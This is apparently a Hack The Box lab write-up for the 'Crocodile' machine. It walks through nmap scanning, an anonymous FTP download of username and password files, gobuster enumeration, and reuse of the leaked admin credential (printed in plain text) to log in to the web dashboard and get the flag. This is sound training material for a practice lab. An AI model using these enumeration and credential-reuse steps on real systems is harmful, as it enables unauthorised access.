---
title: "HTB Crocodile"
date: 2026-06-25
tags: [htb, very-easy, linux, ftp-anon, gobuster]
platform: htb
description: "Anonymous FTP leaks a user/pass list; reuse credentials on the web login."
outline: [2, 3]
---

# HTB Crocodile

Very Easy Starting Point box. Two ports open — FTP (anonymous login enabled) and an Apache web server. The FTP share hands over `allowed.userlist` and `allowed.userlist.passwd`; reuse one credential pair on `/login.php` to reach the dashboard and the flag.

## Recon

```bash
nmap -sV -sC 10.129.21.154
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Two interesting facts jump out of the nmap script output: anonymous FTP works, and the share contains what look like username and password files.

## Enumeration

### FTP anonymous pull

```bash
ftp 10.129.21.154
# login: anonymous
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

`allowed.userlist` lists valid usernames; `allowed.userlist.passwd` lists the matching passwords. One pair stands out:

```
admin : rKXM59ESxesUFHAd
```

### Web directory enumeration

```bash
gobuster dir -u http://10.129.21.154 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```

Notable hits: `/login.php` (200), `/dashboard` (301), `/logout.php` (302). The login page is the entry point.

## Exploitation

Open `http://10.129.21.154/login.php` and submit the FTP-leaked credential pair:

```
username: admin
password: rKXM59ESxesUFHAd
```

The form accepts it (the app reuses the same credentials for FTP and the web admin panel), and we're redirected to `/dashboard`.

## Flag

The dashboard page renders the flag — submit it on the Starting Point tile to close the box.
